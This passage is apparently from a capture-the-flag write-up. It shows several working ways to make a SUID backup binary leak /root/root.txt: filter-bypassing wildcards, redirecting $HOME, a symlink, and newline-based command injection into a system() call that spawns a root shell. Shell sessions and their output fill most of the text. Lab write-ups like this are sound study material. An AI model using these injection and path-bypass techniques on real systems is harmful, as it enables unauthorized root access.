QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ
```

>   The password `magicword` we found works for this zip file.

Ahh.. We got trolled.

### Wildcard Method

Then I realised it’s because some strings and characters are being filtered out when we run `ltrace` on the program.

Lets try applying some wildcards while executing the program. OwO

```bash
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > test3
<72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > test3  
tom@node:/tmp$ cat test3 | base64 --decode > decoded3
cat test3 | base64 --decode > decoded3
tom@node:/tmp$ file decoded3
file decoded3
decoded3: Zip archive data, at least v1.0 to extract
tom@node:/tmp$ unzip decoded3
unzip decoded3
Archive:  decoded3
   skipping: root/root.txt           unable to get password
tom@node:/tmp$ unzip -P magicword decoded3
unzip -P magicword decoded3
Archive:  decoded3
 extracting: root/root.txt           
tom@node:/tmp$ cat root/root.txt
cat root/root.txt
1722e99ca5f353b362556a62bd5e6be0
```

### Home Variable

As the `~` character is not being filtered, we can set the `$HOME` variable to be `/root`.

```bash
tom@node:/tmp$ export HOME=/root
export HOME=/root
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "~" > test
<72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "~" > test              
tom@node:/tmp$ cat test | base64 --decode > decoded
cat test | base64 --decode > decoded
tom@node:/tmp$ unzip -P magicword decoded
unzip -P magicword decoded
Archive:  decoded
   creating: root/
  inflating: root/.profile           
  inflating: root/.bash_history      
   creating: root/.cache/
 extracting: root/.cache/motd.legal-displayed  
 extracting: root/root.txt           
  inflating: root/.bashrc            
  inflating: root/.viminfo           
   creating: root/.nano/
 extracting: root/.nano/search_history  
tom@node:/tmp$ cat root/root.txt
cat root/root.txt
1722e99ca5f353b362556a62bd5e6be0
```

### Symlink Method

We can also create a symbolic link to a file that points to `/root/root.txt`.

```bash
tom@node:/tmp$ mkdir tmpdir
mkdir tmpdir
tom@node:/tmp$ cd tmpdir
cd tmpdir
tom@node:/tmp/tmpdir$ ln -s /root/root.txt test
ln -s /root/root.txt test
tom@node:/tmp/tmpdir$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/tmpdir 
<80e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/tmpdir      
UEsDBAoAAAAAAFwxvVQAAAAAAAAAAAAAAAALABwAdG1wL3RtcGRpci9VVAkAA2AAk2J6AJNidXgLAAEE6AMAAAToAwAAUEsDBAoACQAAANR9I0vyjjdALQAAACEAAAAPABwAdG1wL3RtcGRpci90ZXN0VVQJAAPQFaxZPvySYnV4CwABBAAAAAAEAAAAAI1BvUsO3jJJELsmf30JA7nNVaAloxJ/SqKI1gqV4VXFySr0DxndoNH4jLsSSFBLBwjyjjdALQAAACEAAABQSwECHgMKAAAAAABcMb1UAAAAAAAAAAAAAAAACwAYAAAAAAAAABAA7UEAAAAAdG1wL3RtcGRpci9VVAUAA2AAk2J1eAsAAQToAwAABOgDAABQSwECHgMKAAkAAADUfSNL8o43QC0AAAAhAAAADwAYAAAAAAABAAAAoIFFAAAAdG1wL3RtcGRpci90ZXN0VVQFAAPQFaxZdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAACAAIApgAAAMsAAAAAAA==
tom@node:/tmp/tmpdir$ echo "UEsDBAoAAAAAAFwxvVQAAAAAAAAAAAAAAAALABwAdG1wL3RtcGRpci9VVAkAA2AAk2J6AJNidXgLAAEE6AMAAAToAwAAUEsDBAoACQAAANR9I0vyjjdALQAAACEAAAAPABwAdG1wL3RtcGRpci90ZXN0VVQJAAPQFaxZPvySYnV4CwABBAAAAAAEAAAAAI1BvUsO3jJJELsmf30JA7nNVaAloxJ/SqKI1gqV4VXFySr0DxndoNH4jLsSSFBLBwjyjjdALQAAACEAAABQSwECHgMKAAAAAABcMb1UAAAAAAAAAAAAAAAACwAYAAAAAAAAABAA7UEAAAAAdG1wL3RtcGRpci9VVAUAA2AAk2J1eAsAAQToAwAABOgDAABQSwECHgMKAAkAAADUfSNL8o43QC0AAAAhAAAADwAYAAAAAAABAAAAoIFFAAAAdG1wL3RtcGRpci90ZXN0VVQFAAPQFaxZdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAACAAIApgAAAMsAAAAAAA==" | base64 --decode > decoded    
<EsFBgAAAAACAAIApgAAAMsAAAAAAA==" | base64 --decode > decoded  
tom@node:/tmp/tmpdir$ unzip -P magicword decoded
unzip -P magicword decoded
Archive:  decoded
   creating: tmp/tmpdir/
 extracting: tmp/tmpdir/test   
tom@node:/tmp/tmpdir$ cat tmp/tmpdir/test
cat tmp/tmpdir/test
1722e99ca5f353b362556a62bd5e6be0
```

### Command Injection

Recall that `ltrace` showed us this system call:

```c
system("/usr/bin/zip -r -P magicword /tm"... <no return ...>
```

Since we cannot use `;` to execute multiple commands in the system call, we could use a newline to do so.

```bash
tom@node:/tmp$ newline=$'\n'
newline=$'\n'
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "shiro${newline}/bin/bash${newline}shiro"
<0afc3d98a8d0230167104d474 "shiro${newline}/bin/bash${newline}shiro"         
	zip warning: name not matched: shiro

zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_1492681799 . -i shiro)
whoami
root
cat /root/root.txt
1722e99ca5f353b362556a62bd5e6be0

OR

tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'shiro\n/bin/bash\nshiro')"
<c3d98a8d0230167104d474 "$(printf 'shiro\n/bin/bash\nshiro')"                
	zip warning: name not matched: shiro

zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_1348659861 . -i shiro)
whoami
root
cat /root/root.txt
1722e99ca5f353b362556a62bd5e6be0
```

